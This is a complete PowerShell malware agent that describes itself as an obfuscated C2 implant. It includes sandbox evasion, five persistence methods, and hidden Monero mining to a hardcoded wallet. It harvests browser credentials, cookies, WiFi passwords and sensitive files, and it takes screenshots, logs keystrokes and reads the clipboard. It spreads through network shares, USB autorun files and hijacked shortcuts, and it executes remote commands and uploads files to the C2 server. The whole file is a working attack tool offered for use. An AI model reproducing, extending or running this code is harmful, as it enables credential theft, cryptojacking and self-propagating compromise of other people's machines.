# PowerShell Agent for Windows
# Obfuscated C2 agent with persistence, mining, and data collection

param(
    [string]$C2Server = "http://127.0.0.1:5000",
    [string]$Wallet = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5",
    [string]$Pool = "pool.monero.hashvault.pro:443"
)

# Anti-analysis checks
function Test-Sandbox {
    $checks = @(
        # Check for VM artifacts
        { Get-WmiObject -Class Win32_BIOS | Where-Object { $_.SerialNumber -match "VMware|VirtualBox|Xen|KVM|QEMU" } },
        { Get-WmiObject -Class Win32_ComputerSystem | Where-Object { $_.Model -match "Virtual|VMware|VirtualBox" } },
        { Get-WmiObject -Class Win32_VideoController | Where-Object { $_.Name -match "VMware|VBox|QEMU" } },
        # Check for analysis tools
        { Get-Process -Name "wireshark","fiddler","procmon","procexp","ollydbg","x64dbg","ida" -ErrorAction SilentlyContinue },
        # Check for sandbox indicators
        { if ($env:USERNAME -match "sandbox|virus|malware|sample|test") { $true } },
        # Check CPU cores (sandboxes often have 1-2)
        { if ((Get-WmiObject Win32_Processor).NumberOfLogicalProcessors -lt 2) { $true } },
        # Check RAM (sandboxes often have < 4GB)
        { if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { $true } },
        # Check uptime (sandboxes often have short uptime)
        { if ((Get-CimInstance Win32_OperatingSystem).LastBootUpTime -gt (Get-Date).AddHours(-1)) { $true } }
    )
    
    foreach ($check in $checks) {
        try {
            if (& $check) { return $true }
        } catch {}
    }
    return $false
}

# Exit if sandbox detected
if (Test-Sandbox) {
    Start-Sleep -Seconds (Get-Random -Minimum 60 -Maximum 300)
    exit
}

# Generate Agent ID
function New-AgentId {
    $data = "$env:COMPUTERNAME-$env:USERNAME-$([DateTime]::Now.Ticks)"
    $sha1 = [System.Security.Cryptography.SHA1]::Create()
    $hash = $sha1.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($data))
    return [System.BitConverter]::ToString($hash).Replace("-", "").Substring(0, 16).ToLower()
}

$AgentId = New-AgentId

# System Information
function Get-SystemInfo {
    @{
        agent_id = $AgentId
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        domain = $env:USERDOMAIN
        os = (Get-CimInstance Win32_OperatingSystem).Caption
        arch = $env:PROCESSOR_ARCHITECTURE
        cpu = (Get-WmiObject Win32_Processor).Name
        cpu_cores = (Get-WmiObject Win32_Processor).NumberOfLogicalProcessors
        ram_gb = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
        gpu = (Get-WmiObject Win32_VideoController).Name -join ", "
        ip_internal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127.*" }).IPAddress
        ip_external = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content
        installed_sw = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName).DisplayName -join ", "
        av = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct).displayName -join ", "
        admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }
}

# Register with C2
function Register-Agent {
    try {
        $info = Get-SystemInfo | ConvertTo-Json -Depth 3
        $response = Invoke-RestMethod -Uri "$C2Server/api/agent/register" -Method Post -Body $info -ContentType "application/json" -TimeoutSec 10
        return $response.status -eq "ok"
    } catch {
        return $false
    }
}

# Get tasks from C2
function Get-Tasks {
    try {
        $response = Invoke-RestMethod -Uri "$C2Server/api/agent/tasks?agent_id=$AgentId" -TimeoutSec 10
        return $response.tasks
    } catch {
        return @()
    }
}

# Submit task result
function Submit-Result {
    param($TaskId, $Result)
    try {
        $body = @{
            agent_id = $AgentId
            task_id = $TaskId
            result = $Result
        } | ConvertTo-Json -Depth 3
        
        Invoke-RestMethod -Uri "$C2Server/api/agent/result" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10
    } catch {}
}

# Persistence mechanisms
function Install-Persistence {
    $scriptPath = $PSCommandPath
    if (-not $scriptPath) { $scriptPath = "$env:TEMP\.update.ps1" }
    
    # Method 1: Registry Run key
    try {
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
    } catch {}
    
    # Method 2: Scheduled Task
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtLogon
        Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger -RunLevel Highest -Force
    } catch {}
    
    # Method 3: WMI Event Subscription
    try {
        $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
            Name = "SystemUpdateFilter"
            QueryLanguage = "WQL"
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        }
        
        $consumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace root\subscription -Arguments @{
            Name = "SystemUpdateConsumer"
            ScriptingEngine = "VBScript"
            ScriptText = "CreateObject(""WScript.Shell"").Run ""powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath"", 0"
        }
        
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{
            Filter = $filter
            Consumer = $consumer
        }
    } catch {}
    
    # Method 4: Startup folder
    try {
        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        $batContent = @"
@echo off
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$scriptPath"
"@
        Set-Content -Path "$startupPath\SystemUpdate.bat" -Value $batContent
    } catch {}
    
    # Method 5: Service (requires admin)
    try {
        if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            New-Service -Name "SystemUpdate" -BinaryPathName "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -StartupType Automatic
            Start-Service -Name "SystemUpdate"
        }
    } catch {}
}

# Download and execute XMRig
function Start-Mining {
    try {
        $xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
        $downloadPath = "$env:TEMP\.cache\xmrig.zip"
        $extractPath = "$env:TEMP\.cache\xmrig"
        
        # Create directory
        New-Item -ItemType Directory -Force -Path $extractPath | Out-Null
        
        # Download
        Invoke-WebRequest -Uri $xmrigUrl -OutFile $downloadPath -UseBasicParsing
        
        # Extract
        Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force
        
        # Find xmrig executable
        $xmrig = Get-ChildItem -Path $extractPath -Filter "xmrig.exe" -Recurse | Select-Object -First 1
        
        if ($xmrig) {
            # Start mining with low priority
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = $xmrig.FullName
            $psi.Arguments = "--url $Pool --user $Wallet --pass $AgentId --tls --background --donate-level 1 --priority 5"
            $psi.WindowStyle = "Hidden"
            $psi.CreateNoWindow = $true
            
            [System.Diagnostics.Process]::Start($psi) | Out-Null
            return $true
        }
    } catch {}
    return $false
}

# Collect browser credentials
function Get-BrowserCredentials {
    $credentials = @()
    
    # Chrome
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $chromePath) {
        try {
            # Copy database (Chrome locks it)
            $tempDb = "$env:TEMP\chrome_db"
            Copy-Item $chromePath $tempDb -Force
            
            # Would need SQLite library to decrypt
            # For now, just note the file exists
            $credentials += @{ browser = "chrome"; path = $chromePath }
            
            Remove-Item $tempDb -Force
        } catch {}
    }
    
    # Firefox
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxPath) {
        Get-ChildItem $firefoxPath -Directory | ForEach-Object {
            $loginsPath = Join-Path $_.FullName "logins.json"
            if (Test-Path $loginsPath) {
                $credentials += @{ browser = "firefox"; path = $loginsPath }
            }
        }
    }
    
    # Edge
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    if (Test-Path $edgePath) {
        $credentials += @{ browser = "edge"; path = $edgePath }
    }
    
    return $credentials
}

# Collect browser cookies
function Get-BrowserCookies {
    $cookies = @()
    
    # Chrome cookies
    $chromeCookies = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
    if (Test-Path $chromeCookies) {
        $cookies += @{ browser = "chrome"; path = $chromeCookies }
    }
    
    # Firefox cookies
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxPath) {
        Get-ChildItem $firefoxPath -Directory | ForEach-Object {
            $cookiesPath = Join-Path $_.FullName "cookies.sqlite"
            if (Test-Path $cookiesPath) {
                $cookies += @{ browser = "firefox"; path = $cookiesPath }
            }
        }
    }
    
    return $cookies
}

# Collect WiFi passwords
function Get-WifiPasswords {
    $networks = @()
    
    try {
        $profiles = netsh wlan show profiles | Select-String "All User Profile\s*:\s*(.+)" | ForEach-Object { $_.Matches.Groups[1].Value }
        
        foreach ($profile in $profiles) {
            $key = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content\s*:\s*(.+)" | ForEach-Object { $_.Matches.Groups[1].Value }
            if ($key) {
                $networks += @{ ssid = $profile; password = $key }
            }
        }
    } catch {}
    
    return $networks
}

# Collect sensitive files
function Get-SensitiveFiles {
    $files = @()
    
    $searchPaths = @(
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Downloads"
    )
    
    $patterns = @(
        "*.pwd", "*.password", "*.pass", "*password*",
        "*wallet*", "*crypto*", "*seed*",
        "*.key", "*.pem", "*.p12", "*.pfx",
        "*backup*", "*secret*", "*credential*"
    )
    
    foreach ($path in $searchPaths) {
        if (Test-Path $path) {
            foreach ($pattern in $patterns) {
                Get-ChildItem -Path $path -Filter $pattern -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                    $files += @{ path = $_.FullName; size = $_.Length }
                }
            }
        }
    }
    
    return $files
}

# Screenshot capture
function Get-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        
        $stream = New-Object System.IO.MemoryStream
        $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
        
        return [Convert]::ToBase64String($stream.ToArray())
    } catch {
        return $null
    }
}

# Keylogger
function Start-Keylogger {
    $logPath = "$env:TEMP\.cache\keys.log"
    
    # Create hidden window for key capture
    $code = @'
    using System;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;
    
    public class KeyLogger {
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);
        
        public static void Log(string path) {
            while (true) {
                for (int i = 8; i < 255; i++) {
                    if (GetAsyncKeyState(i) == -32767) {
                        string key = ((Keys)i).ToString();
                        System.IO.File.AppendAllText(path, key + "\n");
                    }
                }
                System.Threading.Thread.Sleep(10);
            }
        }
    }
'@
    
    try {
        Add-Type -TypeDefinition $code -Language CSharp
        Start-Job -ScriptBlock { param($p) [KeyLogger]::Log($p) } -ArgumentList $logPath
    } catch {}
}

# Clipboard monitor
function Get-Clipboard {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        return [Windows.Forms.Clipboard]::GetText()
    } catch {
        return $null
    }
}

# Propagation
function Invoke-Propagation {
    $spread = 0
    
    # Method 1: Network shares
    try {
        $shares = net view | Select-String "\\\\([^\s]+)" | ForEach-Object { $_.Matches.Groups[1].Value }
        
        foreach ($share in $shares) {
            try {
                $targetPath = "\\$share\C$\Users\Public\.update.ps1"
                Copy-Item $PSCommandPath $targetPath -Force
                
                # Execute via WMI
                Invoke-WmiMethod -ComputerName $share -Class Win32_Process -Name Create -ArgumentList "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\.update.ps1"
                $spread++
            } catch {}
        }
    } catch {}
    
    # Method 2: USB drives
    try {
        Get-WmiObject Win32_Volume | Where-Object { $_.DriveType -eq 2 } | ForEach-Object {
            $usbPath = Join-Path $_.DriveLetter "update.ps1"
            Copy-Item $PSCommandPath $usbPath -Force
            
            # Create autorun
            $autorun = @"
[autorun]
open=powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File update.ps1
action=Open folder
"@
            Set-Content -Path (Join-Path $_.DriveLetter "autorun.inf") -Value $autorun
            $spread++
        }
    } catch {}
    
    # Method 3: LNK hijacking
    try {
        $desktopPath = "$env:USERPROFILE\Desktop"
        Get-ChildItem $desktopPath -Filter "*.lnk" | ForEach-Object {
            $shell = New-Object -ComObject WScript.Shell
            $shortcut = $shell.CreateShortcut($_.FullName)
            
            # Modify shortcut to run our script first
            $originalTarget = $shortcut.TargetPath
            $shortcut.TargetPath = "powershell.exe"
            $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"& { Start-Process '$PSCommandPath'; Start-Process '$originalTarget' }`""
            $shortcut.Save()
            $spread++
        }
    } catch {}
    
    return $spread
}

# Execute task
function Invoke-Task {
    param($Task)
    
    $taskId = $Task.id
    $taskType = $Task.task_type
    $payload = $Task.payload | ConvertFrom-Json
    
    $result = @{
        status = "completed"
        timestamp = Get-Date -Format "o"
    }
    
    switch ($taskType) {
        "cmd" {
            try {
                $output = Invoke-Expression $payload.cmd 2>&1
                $result.stdout = $output | Out-String
            } catch {
                $result.status = "failed"
                $result.error = $_.Exception.Message
            }
        }
        
        "download" {
            try {
                Invoke-WebRequest -Uri $payload.url -OutFile $payload.path -UseBasicParsing
                $result.path = $payload.path
            } catch {
                $result.status = "failed"
                $result.error = $_.Exception.Message
            }
        }
        
        "upload" {
            try {
                if (Test-Path $payload.path) {
                    $result.data = [Convert]::ToBase64String([IO.File]::ReadAllBytes($payload.path))
                }
            } catch {
                $result.status = "failed"
            }
        }
        
        "collect" {
            $result.data = @{
                browser_credentials = Get-BrowserCredentials
                browser_cookies = Get-BrowserCookies
                wifi_passwords = Get-WifiPasswords
                sensitive_files = Get-SensitiveFiles
                clipboard = Get-Clipboard
                screenshot = Get-Screenshot
            }
        }
        
        "propagate" {
            $result.spread_count = Invoke-Propagation
        }
        
        "mining_start" {
            $result.mining_started = Start-Mining
        }
        
        "mining_stop" {
            Get-Process xmrig -ErrorAction SilentlyContinue | Stop-Process -Force
            $result.mining_stopped = $true
        }
        
        "screenshot" {
            $result.screenshot = Get-Screenshot
        }
        
        "keylog_start" {
            Start-Keylogger
            $result.keylogger_started = $true
        }
        
        "persistence" {
            Install-Persistence
            $result.persistence_installed = $true
        }
    }
    
    Submit-Result -TaskId $taskId -Result $result
}

# Main loop
function Main {
    # Initial registration
    Register-Agent
    
    # Install persistence
    Install-Persistence
    
    # Start mining
    Start-Mining
    
    # Main loop
    while ($true) {
        try {
            # Get and execute tasks
            $tasks = Get-Tasks
            foreach ($task in $tasks) {
                Invoke-Task -Task $task
            }
            
            # Heartbeat
            Register-Agent
            
            # Random interval for stealth
            Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 120)
            
        } catch {
            Start-Sleep -Seconds 60
        }
    }
}

# Self-copy to temp if running from network
if ($PSCommandPath -like "\\*") {
    $localPath = "$env:TEMP\.update.ps1"
    Copy-Item $PSCommandPath $localPath -Force
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPath`"" -WindowStyle Hidden
    exit
}

# Run main
Main
